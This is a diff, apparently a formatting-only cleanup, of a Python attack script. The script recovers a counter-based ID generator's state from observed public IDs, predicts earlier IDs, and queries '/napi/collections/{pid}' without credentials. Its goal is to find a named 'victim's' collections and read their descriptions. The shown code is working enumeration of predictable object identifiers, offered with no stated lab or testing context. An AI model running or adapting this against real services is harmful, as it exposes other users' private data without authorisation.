@@ -27,9 +27,7 @@ def _decode_candidates(public_id: str) -> list[int]:
     """Return all 64 possible counter values for a public_id."""
     padded = public_id + "A"  # pad 12th char with 'A' (= 0)
     try:
-        base = int.from_bytes(
-            base64.urlsafe_b64decode(padded + "=="), "big"
-        )
+        base = int.from_bytes(base64.urlsafe_b64decode(padded + "=="), "big")
     except Exception:
         return []
     # The 12th char contributed 6 unknown bits. Try all 64 values.
@@ -39,7 +37,7 @@ def _decode_candidates(public_id: str) -> list[int]:
 def recover_state(observed: Sequence[str]) -> Optional[int]:
     """
     Find the counter value corresponding to the first observed ID.
-    
+
     Strategy: decode all candidates for each ID, find a pair of consecutive
     IDs whose counter difference is small (1-20).
     """
@@ -72,10 +70,7 @@ async def find_victim_collection(
     Try counter values start_counter-1, start_counter-2, ..., start_counter-max_reverse.
     For each, compute the public_id and check if it belongs to the victim.
     """
-    candidates = [
-        _encode_counter(start_counter - k)
-        for k in range(1, max_reverse + 1)
-    ]
+    candidates = [_encode_counter(start_counter - k) for k in range(1, max_reverse + 1)]
 
     sem = asyncio.Semaphore(batch_size)
     timeout = httpx.Timeout(3.0, connect=3.0)
@@ -84,12 +79,17 @@ async def find_victim_collection(
         async with sem:
             try:
                 r = await conn.get(
-                    f"/napi/collections/{pid}", cookies=None, timeout=timeout,
+                    f"/napi/collections/{pid}",
+                    cookies=None,
+                    timeout=timeout,
                 )
                 if r.status_code != 200:
                     return None
                 data = r.json()
-                if data.get("user", {}).get("username", "").lower() != victim_name.lower():
+                if (
+                    data.get("user", {}).get("username", "").lower()
+                    != victim_name.lower()
+                ):
                     return None
                 return data.get("description") or ""
             except Exception:
